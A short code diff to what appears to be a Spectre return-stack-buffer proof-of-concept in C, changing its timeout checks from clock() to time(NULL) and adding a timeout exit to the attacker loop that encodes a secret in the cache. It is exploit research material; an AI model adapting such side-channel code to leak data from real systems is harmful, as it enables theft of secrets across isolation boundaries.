@@ -27,18 +27,23 @@ void __attribute__((noinline)) in_place()
 
 void __attribute__((noinline)) attacker()
 {
+    start_time = time(NULL);
     for (int i = 0; i < MAX_TRY_TIMES; i++)
     {
         in_place();
         // Encode data in cache
         // Victim is supposed to return
         cache_encode(secret);
+        if (time(NULL) - start_time > timeout)
+        {
+            exit(-1);
+        }
     }
 }
 
 char __attribute__((noinline)) victim()
 {
-    start_time = clock();
+    start_time = time(NULL);
     for (int j = 0; j < MAX_TRY_TIMES; j++)
     {
         // Flush our shared memory
@@ -60,7 +65,7 @@ char __attribute__((noinline)) victim()
                 }
             }
         }
-        if (clock() - start_time > timeout)
+        if (time(NULL) - start_time > timeout)
         {
             printf(ANSI_COLOR_YELLOW "Spectre_RSB_ca_ip: Timeout" ANSI_COLOR_RESET "\n");
             exit(-1);
